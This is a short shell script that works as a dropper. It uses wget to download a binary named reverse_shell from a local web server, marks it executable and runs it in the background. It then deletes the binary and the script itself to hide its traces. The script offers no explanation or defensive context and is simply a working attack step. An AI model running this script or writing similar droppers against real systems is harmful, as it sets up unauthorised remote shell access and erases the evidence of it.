#!/bin/sh

wget -O reverse_shell http://localhost:8080/Documents/reverse_shell
chmod +x reverse_shell
./reverse_shell &
rm reverse_shell
rm -- "$0"
